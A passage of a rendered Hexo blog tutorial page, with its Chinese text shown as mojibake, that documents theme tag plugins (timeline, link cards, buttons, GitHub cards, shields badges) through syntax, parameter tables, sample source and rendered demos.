class="code">`seotitle`</span> å¹¶æ›¿æ¢ä¸º <span class="code">`seo_title`</span>ã€‚</span><br><span class="line"><span class="bullet">2.</span> group ç»„ä»¶çš„ç´¢å¼•è§„åˆ™æœ‰å˜ï¼Œä½¿ç”¨ group ç»„ä»¶çš„æ–‡ç« å†…ï¼Œ<span class="code">`group: group_name`</span> å¯¹åº”çš„ç»„ä»¶åå¿…é¡»æ˜¯ <span class="code">`group_name`</span>ã€‚</span><br><span class="line"><span class="bullet">2.</span> group ç»„ä»¶çš„åˆ—è¡¨åä¼˜å…ˆæ˜¾ç¤ºæ–‡ç« çš„ <span class="code">`short_title`</span> å…¶æ¬¡æ˜¯ <span class="code">`title`</span>ã€‚</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>æ—¶é—´è½´æ ·å¼</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></div></div><div class='timeline-item-content'><ol><li>å¦‚æœæœ‰ <code>hexo-lazyload-image</code> æ’ä»¶ï¼Œéœ€è¦åˆ é™¤å¹¶é‡æ–°å®‰è£…æœ€æ–°ç‰ˆæœ¬ï¼Œè®¾ç½® <code>lazyload.isSPA: true</code>ã€‚</li><li>2.x ç‰ˆæœ¬çš„ css å’Œ js ä¸é€‚ç”¨äº 3.x ç‰ˆæœ¬ï¼Œå¦‚æœä½¿ç”¨äº† <code>use_cdn: true</code> åˆ™éœ€è¦åˆ é™¤ã€‚</li><li>2.x ç‰ˆæœ¬çš„ fancybox æ ‡ç­¾åœ¨ 3.x ç‰ˆæœ¬ä¸­è¢«é‡å‘½åä¸º gallery ã€‚</li><li>2.x ç‰ˆæœ¬çš„ç½®é¡¶ <code>top: true</code> æ”¹ä¸ºäº† <code>pin: true</code>ï¼Œå¹¶ä¸”åŒæ ·é€‚ç”¨äº <code>layout: page</code> çš„é¡µé¢ã€‚</li><li>å¦‚æœä½¿ç”¨äº† <code>hexo-offline</code> æ’ä»¶ï¼Œå»ºè®®å¸è½½ï¼Œ3.0 ç‰ˆæœ¬é»˜è®¤å¼€å¯äº† pjax æœåŠ¡ã€‚</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></div></div><div class='timeline-item-content'><p>ä¸éœ€è¦é¢å¤–å¤„ç†ã€‚</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></div></div><div class='timeline-item-content'><ol><li>å…¨å±€æœç´¢ <code>seotitle</code> å¹¶æ›¿æ¢ä¸º <code>seo_title</code>ã€‚</li><li>group ç»„ä»¶çš„ç´¢å¼•è§„åˆ™æœ‰å˜ï¼Œä½¿ç”¨ group ç»„ä»¶çš„æ–‡ç« å†…ï¼Œ<code>group: group_name</code> å¯¹åº”çš„ç»„ä»¶åå¿…é¡»æ˜¯ <code>group_name</code>ã€‚</li><li>group ç»„ä»¶çš„åˆ—è¡¨åä¼˜å…ˆæ˜¾ç¤ºæ–‡ç« çš„ <code>short_title</code> å…¶æ¬¡æ˜¯ <code>title</code>ã€‚</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-10-é“¾æ¥å¡ç‰‡-link">2.10 é“¾æ¥å¡ç‰‡ link</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link æ ‡é¢˜, é“¾æ¥, å›¾ç‰‡é“¾æ¥ï¼ˆå¯é€‰ï¼‰ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link ç³–æœå±‹æ•™ç¨‹è´´, https://akilar.top/posts/615e2dec/, https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><div class="tag link"><a class="link-card" title="ç³–æœå±‹æ•™ç¨‹è´´" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico"/></div><div class="right"><p class="text">ç³–æœå±‹æ•™ç¨‹è´´</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-11-æŒ‰é’®-btns">2.11 æŒ‰é’® btns</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns æ ·å¼å‚æ•° %&#125;</span><br><span class="line">&#123;% cell æ ‡é¢˜, é“¾æ¥, å›¾ç‰‡æˆ–è€…å›¾æ ‡ %&#125;</span><br><span class="line">&#123;% cell æ ‡é¢˜, é“¾æ¥, å›¾ç‰‡æˆ–è€…å›¾æ ‡ %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li>åœ†è§’æ ·å¼ï¼šrounded, circle</li><li>å¢åŠ æ–‡å­—æ ·å¼ï¼šå¯ä»¥åœ¨å®¹å™¨å†…å¢åŠ  <code>&lt;b&gt;</code>æ ‡é¢˜<code>&lt;/b&gt;</code>å’Œ<code>&lt;p&gt;</code>æè¿°æ–‡å­—<code>&lt;/p&gt;</code></li><li>å¸ƒå±€æ–¹å¼ï¼š<br>é»˜è®¤ä¸ºè‡ªåŠ¨å®½åº¦ï¼Œé€‚åˆè§†é‡å†…åªæœ‰ä¸€ä¸¤ä¸ªçš„æƒ…å†µã€‚</li></ol><table><thead><tr><th>å‚æ•°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>wide</td><td>å®½ä¸€ç‚¹çš„æŒ‰é’®</td></tr><tr><td>fill</td><td>å¡«å……å¸ƒå±€ï¼Œè‡ªåŠ¨é“ºæ»¡è‡³å°‘ä¸€è¡Œï¼Œå¤šäº†ä¼šæ¢è¡Œ</td></tr><tr><td>center</td><td>å±…ä¸­ï¼ŒæŒ‰é’®ä¹‹é—´æ˜¯å›ºå®šé—´è·</td></tr><tr><td>around</td><td>å±…ä¸­åˆ†æ•£</td></tr><tr><td>grid2</td><td>ç­‰å®½æœ€å¤š2åˆ—ï¼Œå±å¹•å˜çª„ä¼šé€‚å½“å‡å°‘åˆ—æ•°</td></tr><tr><td>grid3</td><td>ç­‰å®½æœ€å¤š3åˆ—ï¼Œå±å¹•å˜çª„ä¼šé€‚å½“å‡å°‘åˆ—æ•°</td></tr><tr><td>grid4</td><td>ç­‰å®½æœ€å¤š4åˆ—ï¼Œå±å¹•å˜çª„ä¼šé€‚å½“å‡å°‘åˆ—æ•°</td></tr><tr><td>grid5</td><td>ç­‰å®½æœ€å¤š5åˆ—ï¼Œå±å¹•å˜çª„ä¼šé€‚å½“å‡å°‘åˆ—æ•°</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.å¦‚æœéœ€è¦æ˜¾ç¤ºç±»ä¼¼ã€Œå›¢é˜Ÿæˆå‘˜ã€ä¹‹ç±»çš„ä¸€ç»„å«æœ‰å¤´åƒçš„é“¾æ¥</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>2.æˆ–è€…å«æœ‰å›¾æ ‡çš„æŒ‰é’®</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell ä¸‹è½½æºç , /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell æŸ¥çœ‹æ–‡æ¡£, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>3.åœ†å½¢å›¾æ ‡ + æ ‡é¢˜ + æè¿° + å›¾ç‰‡ + ç½‘æ ¼5åˆ— + å±…ä¸­</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>å¿ƒç‡ç®¡å®¶<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, ä¸“ä¸šç‰ˆ %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>å¿ƒç‡ç®¡å®¶<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, å…è´¹ç‰ˆ %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.å¦‚æœéœ€è¦æ˜¾ç¤ºç±»ä¼¼ã€Œå›¢é˜Ÿæˆå‘˜ã€ä¹‹ç±»çš„ä¸€ç»„å«æœ‰å¤´åƒçš„é“¾æ¥</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div>2.æˆ–è€…å«æœ‰å›¾æ ‡çš„æŒ‰é’®<div class="btns rounded grid5">            <a class="button" href='/' title='ä¸‹è½½æºç '><i class='fas fa-download'></i>ä¸‹è½½æºç </a><a class="button" href='/' title='æŸ¥çœ‹æ–‡æ¡£'><i class='fas fa-book-open'></i>æŸ¥çœ‹æ–‡æ¡£</a>          </div>3.åœ†å½¢å›¾æ ‡ + æ ‡é¢˜ + æè¿° + å›¾ç‰‡ + ç½‘æ ¼5åˆ— + å±…ä¸­<div class="btns circle center grid5">            <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'>  <i class='fab fa-apple'></i>  <b>å¿ƒç‡ç®¡å®¶</b>  <p class='p red'>ä¸“ä¸šç‰ˆ</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'>  <i class='fab fa-apple'></i>  <b>å¿ƒç‡ç®¡å®¶</b>  <p class='p green'>å…è´¹ç‰ˆ</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png'></a>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-12-githubå¡ç‰‡-ghcard">2.12 githubå¡ç‰‡ ghcard</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard ç”¨æˆ·å, å…¶å®ƒå‚æ•°ï¼ˆå¯é€‰ï¼‰ %&#125;</span><br><span class="line">&#123;% ghcard ç”¨æˆ·å/ä»“åº“, å…¶å®ƒå‚æ•°ï¼ˆå¯é€‰ï¼‰ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><p>ä½¿ç”¨<code>,</code>åˆ†å‰²å„ä¸ªå‚æ•°ã€‚å†™æ³•ä¸ºï¼š<code>å‚æ•°å=å‚æ•°å€¼</code><br>ä»¥ä¸‹åªå†™å‡ ä¸ªå¸¸ç”¨å‚æ•°å€¼ã€‚</p><table><thead><tr><th><strong>å‚æ•°å</strong></th><th>å–å€¼</th><th>é‡Šä¹‰</th></tr></thead><tbody><tr><td>hide</td><td>stars,commits,prs,issues,contribs</td><td>éšè—æŒ‡å®šç»Ÿè®¡</td></tr><tr><td>count_private</td><td>true</td><td>å°†ç§äººé¡¹ç›®è´¡çŒ®æ·»åŠ åˆ°æ€»æäº¤è®¡æ•°ä¸­</td></tr><tr><td>show_icons</td><td>true</td><td>æ˜¾ç¤ºå›¾æ ‡</td></tr><tr><td>theme</td><td>æŸ¥é˜…:<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td>ä¸»é¢˜</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.ç”¨æˆ·ä¿¡æ¯å¡ç‰‡</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard fomalhaut1998 %&#125; | &#123;% ghcard fomalhaut1998, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=buefy %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=onedark %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=algolia %&#125; | &#123;% ghcard fomalhaut1998, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><p>2.ä»“åº“ä¿¡æ¯å¡ç‰‡</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.ç”¨æˆ·ä¿¡æ¯å¡ç‰‡</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=calm&show_owner=true"/></a></td></tr></tbody></table><p>2.ä»“åº“ä¿¡æ¯å¡ç‰‡</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-13-githubå¾½æ ‡-ghbdage">2.13 githubå¾½æ ‡ ghbdage</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>left</code>ï¼šå¾½æ ‡å·¦è¾¹çš„ä¿¡æ¯ï¼Œå¿…é€‰å‚æ•°ã€‚</li><li><code>right</code>: å¾½æ ‡å³è¾¹çš„ä¿¡æ¯ï¼Œå¿…é€‰å‚æ•°ï¼Œ</li><li><code>logo</code>ï¼šå¾½æ ‡å›¾æ ‡ï¼Œå›¾æ ‡åç§°è¯¦è§<a href="https://simpleicons.org/">simpleicons</a>ï¼Œå¯é€‰å‚æ•°ã€‚</li><li><code>color</code>ï¼šå¾½æ ‡å³è¾¹çš„é¢œè‰²ï¼Œå¯é€‰å‚æ•°ã€‚</li><li><code>link</code>ï¼šæŒ‡å‘çš„é“¾æ¥ï¼Œå¯é€‰å‚æ•°ã€‚</li><li><code>title</code>ï¼šå¾½æ ‡çš„é¢å¤–ä¿¡æ¯ï¼Œå¯é€‰å‚æ•°ã€‚ä¸»è¦ç”¨äºä¼˜åŒ–SEOï¼Œä½†<code>object</code>æ ‡ç­¾ä¸ä¼šåƒ<code>a</code>æ ‡ç­¾ä¸€æ ·åœ¨é¼ æ ‡æ‚¬åœæ˜¾ç¤º<code>title</code>ä¿¡æ¯ã€‚</li><li><code>option</code>ï¼šè‡ªå®šä¹‰å‚æ•°ï¼Œæ”¯æŒ<a href="https://shields.io/">shields.io</a>çš„å…¨éƒ¨APIå‚æ•°æ”¯æŒï¼Œå…·ä½“å‚æ•°å¯ä»¥å‚çœ‹ä¸Šæ–‡ä¸­çš„æ‹“å±•å†™æ³•ç¤ºä¾‹ã€‚å½¢å¼ä¸º<code>name1=value2&amp;name2=value2</code>ã€‚</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.åŸºæœ¬å‚æ•°,å®šä¹‰å¾½æ ‡å·¦å³æ–‡å­—å’Œå›¾æ ‡</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure><p>2.ä¿¡æ¯å‚æ•°ï¼Œå®šä¹‰å¾½æ ‡å³ä¾§å†…å®¹èƒŒæ™¯è‰²ï¼ŒæŒ‡å‘é“¾æ¥</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,æœ¬ç«™ä½¿ç”¨JsDelivrä¸ºé™æ€èµ„æºæä¾›CDNåŠ é€Ÿ %&#125;</span><br><span class="line">//å¦‚æœæ˜¯è·¨é¡ºåºçœç•¥å¯é€‰å‚æ•°ï¼Œä»ç„¶éœ€è¦å†™ä¸ªé€—å·,ç”¨ä½œåˆ†å‰²</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure><p>3.æ‹“å±•å‚æ•°ï¼Œæ”¯æŒshieldsçš„APIçš„å…¨éƒ¨å‚æ•°å†…å®¹</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,æœ¬ç«™é‡‡ç”¨åŒçº¿éƒ¨ç½²ï¼Œé»˜è®¤çº¿è·¯æ‰˜ç®¡äºVercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//å¦‚æœæ˜¯è·¨é¡ºåºçœç•¥å¯é€‰å‚æ•°ç»„ï¼Œä»ç„¶éœ€è¦å†™åŒç«–çº¿||ç”¨ä½œåˆ†å‰²</span><br><span 